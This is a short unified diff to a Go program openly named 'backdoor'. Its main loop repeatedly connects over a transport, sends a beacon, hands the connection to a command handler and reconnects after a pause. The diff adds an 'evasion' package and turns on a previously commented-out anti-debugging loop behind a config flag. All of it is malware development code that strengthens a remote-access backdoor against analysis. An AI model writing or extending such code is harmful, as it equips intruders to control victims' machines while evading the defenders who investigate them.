@@ -2,6 +2,7 @@ package main
 
 import (
 	"backdoor/config"
+	"backdoor/evasion"
 	"backdoor/handler"
 	"backdoor/transport"
 	"backdoor/utils"
@@ -12,7 +13,6 @@ import (
 )
 
 func main() {
-	// evasion.StartAntiDebugLoop()
 	for {
 		var conn transport.Transport
 		var err error
@@ -44,6 +44,9 @@ func main() {
 			conn.Write([]byte(beacon))
 		}
 
+		if config.AntiDebug {
+			evasion.StartAntiDebugLoop()
+		}
 		handler.Handle(conn)
 		conn.Close()
 		time.Sleep(10 * time.Second)
